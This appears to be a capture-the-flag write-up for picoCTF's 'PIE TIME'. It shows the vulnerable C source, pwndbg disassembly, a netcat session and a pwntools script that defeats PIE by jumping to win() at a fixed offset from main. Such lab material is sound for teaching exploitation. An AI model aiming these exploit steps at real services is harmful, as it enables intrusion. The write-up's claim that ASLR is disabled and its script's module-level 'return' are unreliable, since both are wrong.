# PIE TIME

Level: Easy

## Initial Thoughts
This challenge is called PIE TIME, so right away I am thinking PIE is likely enabled, but nothing else since this is an Easy level challenge.

This thought was solidified further after reading the description:
```text
Can you try to get the flag? Beware we have PIE!
Additional details will be available after launching your challenge instance.
```

As always, I launched the instance and saw three new things:
1. The program source file: `vuln.c`
2. The program binary file: `vuln`
3. A server to connect to via netcat: `nc rescued-float.picoctf.net <port>`

Right away, I checked out the source file and the binary.

First, the source file:
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

What's going on here? Well, there is the obvious: there is a win function; if we call the win function, we get the flag. Awesome. How can we go about that? Well, in the main function, we see it GIVES us the address of main, and gives us an input ot jump to an address. So perhaps we are going to need to jump to the address of win?

Let's summarize. What's the gameplan?
1. Be given the address of main
2. Determine the address of win and main to find the constant offset
3. Jump to win and, well, win!

## Solving the Challenge
Since step 1 is literally given to us, the next thing we need to try to do is determine the address of win(). We can't just grab the address of win() once because PIE is enabled, so it is always going to change. But, here's the key, what about finding the relative offset between main and win?!? Since ASLR isn't enabled, that offset is always going to be the same. Let's find the relative offset real quick, and then it should be easy-peasy to exploit the code.

Let's fire up `gdb` with the program binary (I'll be using `pwngdb` which is just a flavor of `gdb`, but is highly recommended).
```sh
$ pwndbg ./vuln           
Reading symbols from ./vuln...
(No debugging symbols found in ./vuln)
pwndbg> disassemble main
Dump of assembler code for function main:
   0x000000000000133d <+0>:     endbr64
   0x0000000000001341 <+4>:     push   rbp
   0x0000000000001342 <+5>:     mov    rbp,rsp
   0x0000000000001345 <+8>:     sub    rsp,0x20
   0x0000000000001349 <+12>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000001352 <+21>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001356 <+25>:    xor    eax,eax
   0x0000000000001358 <+27>:    lea    rsi,[rip+0xffffffffffffff2a]        # 0x1289 <segfault_handler>
   0x000000000000135f <+34>:    mov    edi,0xb
   0x0000000000001364 <+39>:    call   0x1150 <signal@plt>
   0x0000000000001369 <+44>:    mov    rax,QWORD PTR [rip+0x2ca0]        # 0x4010 <stdout@@GLIBC_2.2.5>
   0x0000000000001370 <+51>:    mov    ecx,0x0
   0x0000000000001375 <+56>:    mov    edx,0x2
   0x000000000000137a <+61>:    mov    esi,0x0
   0x000000000000137f <+66>:    mov    rdi,rax
   0x0000000000001382 <+69>:    call   0x1160 <setvbuf@plt>
   0x0000000000001387 <+74>:    lea    rsi,[rip+0xffffffffffffffaf]        # 0x133d <main>
   0x000000000000138e <+81>:    lea    rdi,[rip+0xcbf]        # 0x2054
   0x0000000000001395 <+88>:    mov    eax,0x0
   0x000000000000139a <+93>:    call   0x1130 <printf@plt>
   0x000000000000139f <+98>:    lea    rdi,[rip+0xcca]        # 0x2070
   0x00000000000013a6 <+105>:   mov    eax,0x0
   0x00000000000013ab <+110>:   call   0x1130 <printf@plt>
   0x00000000000013b0 <+115>:   lea    rax,[rbp-0x18]
   0x00000000000013b4 <+119>:   mov    rsi,rax
   0x00000000000013b7 <+122>:   lea    rdi,[rip+0xce0]        # 0x209e
   0x00000000000013be <+129>:   mov    eax,0x0
   0x00000000000013c3 <+134>:   call   0x1180 <__isoc99_scanf@plt>
   0x00000000000013c8 <+139>:   mov    rax,QWORD PTR [rbp-0x18]
   0x00000000000013cc <+143>:   mov    rsi,rax
   0x00000000000013cf <+146>:   lea    rdi,[rip+0xccc]        # 0x20a2
   0x00000000000013d6 <+153>:   mov    eax,0x0
   0x00000000000013db <+158>:   call   0x1130 <printf@plt>
   0x00000000000013e0 <+163>:   mov    rax,QWORD PTR [rbp-0x18]
   0x00000000000013e4 <+167>:   mov    QWORD PTR [rbp-0x10],rax
   0x00000000000013e8 <+171>:   mov    rax,QWORD PTR [rbp-0x10]
   0x00000000000013ec <+175>:   call   rax
   0x00000000000013ee <+177>:   mov    eax,0x0
   0x00000000000013f3 <+182>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000000013f7 <+186>:   xor    rdx,QWORD PTR fs:0x28
   0x0000000000001400 <+195>:   je     0x1407 <main+202>
   0x0000000000001402 <+197>:   call   0x1120 <__stack_chk_fail@plt>
   0x0000000000001407 <+202>:   leave
   0x0000000000001408 <+203>:   ret
End of assembler dump.
pwndbg> disassemble win
Dump of assembler code for function win:
   0x00000000000012a7 <+0>:     endbr64
   0x00000000000012ab <+4>:     push   rbp
   0x00000000000012ac <+5>:     mov    rbp,rsp
   0x00000000000012af <+8>:     sub    rsp,0x10
   0x00000000000012b3 <+12>:    lea    rdi,[rip+0xd74]        # 0x202e
   0x00000000000012ba <+19>:    call   0x1100 <puts@plt>
   0x00000000000012bf <+24>:    lea    rsi,[rip+0xd71]        # 0x2037
   0x00000000000012c6 <+31>:    lea    rdi,[rip+0xd6c]        # 0x2039
   0x00000000000012cd <+38>:    call   0x1170 <fopen@plt>
   0x00000000000012d2 <+43>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000012d6 <+47>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000000012db <+52>:    jne    0x12f3 <win+76>
   0x00000000000012dd <+54>:    lea    rdi,[rip+0xd5e]        # 0x2042
   0x00000000000012e4 <+61>:    call   0x1100 <puts@plt>
   0x00000000000012e9 <+66>:    mov    edi,0x0
   0x00000000000012ee <+71>:    call   0x1190 <exit@plt>
   0x00000000000012f3 <+76>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00000000000012f7 <+80>:    mov    rdi,rax
   0x00000000000012fa <+83>:    call   0x1140 <fgetc@plt>
   0x00000000000012ff <+88>:    mov    BYTE PTR [rbp-0x9],al
   0x0000000000001302 <+91>:    jmp    0x131e <win+119>
   0x0000000000001304 <+93>:    movsx  eax,BYTE PTR [rbp-0x9]
   0x0000000000001308 <+97>:    mov    edi,eax
   0x000000000000130a <+99>:    call   0x10f0 <putchar@plt>
   0x000000000000130f <+104>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000001313 <+108>:   mov    rdi,rax
   0x0000000000001316 <+111>:   call   0x1140 <fgetc@plt>
   0x000000000000131b <+116>:   mov    BYTE PTR [rbp-0x9],al
   0x000000000000131e <+119>:   cmp    BYTE PTR [rbp-0x9],0xff
   0x0000000000001322 <+123>:   jne    0x1304 <win+93>
   0x0000000000001324 <+125>:   mov    edi,0xa
   0x0000000000001329 <+130>:   call   0x10f0 <putchar@plt>
   0x000000000000132e <+135>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000001332 <+139>:   mov    rdi,rax
   0x0000000000001335 <+142>:   call   0x1110 <fclose@plt>
   0x000000000000133a <+147>:   nop
   0x000000000000133b <+148>:   leave
   0x000000000000133c <+149>:   ret
End of assembler dump.
```

Voiala. From that, we see we have the address 0x000000000000133d for main and 0x00000000000012a7 for win. We can subtract these and we get 0x96. Perfect. Now we know what the relative offset is.

Let's run the service and see if this works:
```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc rescued-float.picoctf.net 56881
Address of main: 0x613514f6433d
Enter the address to jump to, ex => 0x12345: 0x613514f642a7
Your input: 613514f642a7
You won!
picoCTF{<censored>}
```

Awesome! It worked. But what happened? We were given the address of main, we entered the address of main minus the offset, and we got the flag by jumping to that locatoin!

That's great, but now let's automate it! We can use `pwntools` for this:

```python
from pwn import *
import sys

if (len(sys.argv)<=1):
  print("Please pass the port as a parameter")
  return

conn = remote('rescued-float.picoctf.net', sys.argv[1]) # connect to host

main_addr = int(conn.recvline().strip().decode().split(": ")[1], 0) # main_addr parsed from given info
offset = 0x96 # Relative offset between main_addr and win_addr pre-calculated
win_addr = main_addr - offset

conn.sendline(hex(win_addr).encode())

conn.recvline() # this is the line which takes in the input, we don't care about it
conn.recvline() # this also just tells us we won
print(conn.recvline()) # print off the flag!
```